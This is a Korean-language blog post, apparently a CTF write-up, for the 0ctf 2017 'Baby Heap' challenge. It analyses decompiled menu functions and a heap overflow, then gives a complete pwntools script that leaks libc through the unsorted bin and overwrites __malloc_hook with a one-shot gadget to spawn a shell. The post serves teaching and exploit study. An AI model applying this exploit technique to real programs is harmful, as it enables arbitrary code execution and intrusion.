---
layout: post
title: "0ctf Quals 2017 - Baby Heap 2017"
date: 2018-10-30
excerpt: "unsorted bin attack + heap overflow + fastbin dup into stack"
tags: [write-up]
comments: true
---
```
1. Allocate
2. Fill
3. Free
4. Dump
5. Exit
```
우선 main에서는 위와 같이 메뉴 선택을 하게 됩니다. 하나하나 살펴보겠습니다.
* * *
### 1. Allocate
```c
void __fastcall sub_D48(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]
 
  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_138C();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(24LL * i + a1) = 1;
        *(a1 + 24LL * i + 8) = v2;
        *(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```
최대 4096 바이트까지 동적 할당을 할 수 있으며, malloc이 아닌 초기화가 포함된 calloc을 이용해 할당하고 이를 idx로 관리합니다.

### 2. Fill
```c
__int64 __fastcall sub_E7F(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]
 
  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      v3 = result;
      if ( result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```
chunk의 idx와 입력할 바이트를 입력 받아 해당 chunk에 read를 해주며 크기 검사를 하지 않아 heap overflow가 발생합니다.

### 3. Free
```c
__int64 __fastcall sub_F50(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]
 
  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      *(24LL * v2 + a1) = 0;
      *(24LL * v2 + a1 + 8) = 0LL;
      free(*(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(result + 16) = 0LL;
    }
  }
  return result;
}
```
별 다를 것 없이 chunk의 idx를 입력받아 free한다.

### 4. Dump
```c
signed int __fastcall sub_1051(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]
 
  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```
chunk가 free 상태가 아닌 경우 user_data를 출력합니다. main_arena+88를 바로 leak하는 것은 불가능합니다.
* * *
## Exploit

우선 눈여겨보아할 것은 fill에서 size 검사가 제대로 이루어지지 않아 heap overflow가 발생한다는 것인데, 이를 이용해 다른 chunk들의

size나 fd, bk 값을 조작할 수 있는 것에서 exploit이 시작됩니다.



small bin 크기의 chunk를 2개 이상 할당하고 이를 free하면 unsorted bin에 들어가고, 이때 fd와 bk가 main_arena+88를 가르킵니다.

그런데 heap overflow로 fd를 조작할 수 있다는 상황에서 ,

만약 fastbin 크기의 chunk를 free하고, fd를 조작해 smallbin 크기의 chunk 위에 다시 calloc한다면 (chunk가 겹치는 상황)

smallbin을 free한 상태에서 main_arena+88을 dump로 leak하는 것이 가능해집니다.

![heap](https://t1.daumcdn.net/cfile/tistory/99AC4F365BC73C7532)

###### leak이 가능해진 상황의 heap 상황

이후 leak한 libc base를 바탕으로 \_\_malloc_hook 근처 fastbin 크기 내 범위에 fastbin_dup_into_stack을 이용해 fake chunk를 할당한다면

\_\_malloc_hook을 oneshot gadget(magic gadget)으로 덮는 것이 가능해집니다. 그 이후 alloc을 한다면 oneshot gadget이 트리거됩니다.

exp.py
```python
from pwn import *
 
p = process('./babyheap')
 
oneshot = 0x4526a
arena = 0x3c4b78
malloc_hook = 0x3c4b10
 
def alloc(size):
    p.recvuntil('Command: ')
    p.sendline('1')
    p.recvuntil('Size: ')
    p.sendline(str(size))
 
def fill(idx, payload):
    p.recvuntil('Command: ')
    p.sendline('2')
    p.recv()
    p.sendline(str(idx))
    p.recv()
    p.sendline(str(len(payload)))
    p.recv()
    p.sendline(payload)
 
def free(idx):
    p.recvuntil('Command: ')
    p.sendline('3')
    p.recvuntil('Index: ')
    p.sendline(str(idx))
 
def dump(idx):
    p.recvuntil('Command: ')
    p.sendline('4')
    p.recvuntil("Index: ")
    p.sendline(str(idx))
    p.recvuntil("Content: \n")
 
# allocate 4 fastbin sized chunk + 1 smallbin sized chunk
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x20)
alloc(0x80)
 
log.success('Allocation done')
 
# free chunk1, chunk2
free(1)
free(2)
 
log.success('Chunk1, Chunk2 free done')
 
# overwriting chunk2 fd (chunk1 -> chunk4)
payload = p64(0) * 5 + p64(0x31)
payload += p64(0) * 5 + p64(0x31)
payload += p8(0xc0)
 
fill(0, payload)
 
log.success('Fastbin fd overwriting done')
 
# overwriting chunk4 size
payload = p64(0) * 5 + p64(0x31)
fill(3, payload)
 
# allocate twice -> second malloc goes to chunk4
alloc(0x20)
alloc(0x20)
 
# restore chunk4 size & allocate chunk5 & free chunk4
payload = p64(0) * 5 + p64(0x91)
fill(3, payload)
alloc(0x80)
free(4)
log.success('Restored chunk4 size & Allocated chunk5 & Free chunk4')
 
# leak <main_arena+88>
dump(2)
 
leak = u64(p.recv(6).ljust(8,'\x00'))
base = leak - arena
one_gadget = base + oneshot
hook = base + malloc_hook
fake = hook - 0x23
 
log.info('main_arena+88 leaked : ' + str(hex(leak)))
log.info('libc base : ' + str(hex(base)))
log.info('oneshot gadget : ' + str(hex(one_gadget)))
log.info('__malloc_hook : ' + str(hex(hook)))
 
# exploit
alloc(0x65) # idx4
alloc(0x65) # idx6
alloc(0x65) # idx7
 
free(4)
free(7)
payload = p64(8) * 13 + p64(0x71) + p64(fake) # overwriting chunk7 fd
 
fill(6, payload)
 
alloc(0x65)
alloc(0x65)
 
payload = p8(0) * 19
payload += p64(one_gadget)
 
fill(7, payload) # writing oneshot gadget into __malloc_hook
 
alloc(10) # get shell
 
p.interactive()
```
* * *
heap에서 libc leak은 대부분 unsorted bin의 fd와 bk에서 일어난다는데 이 부분에 대해서 공부를 더 해봐야할 것 같습니다.
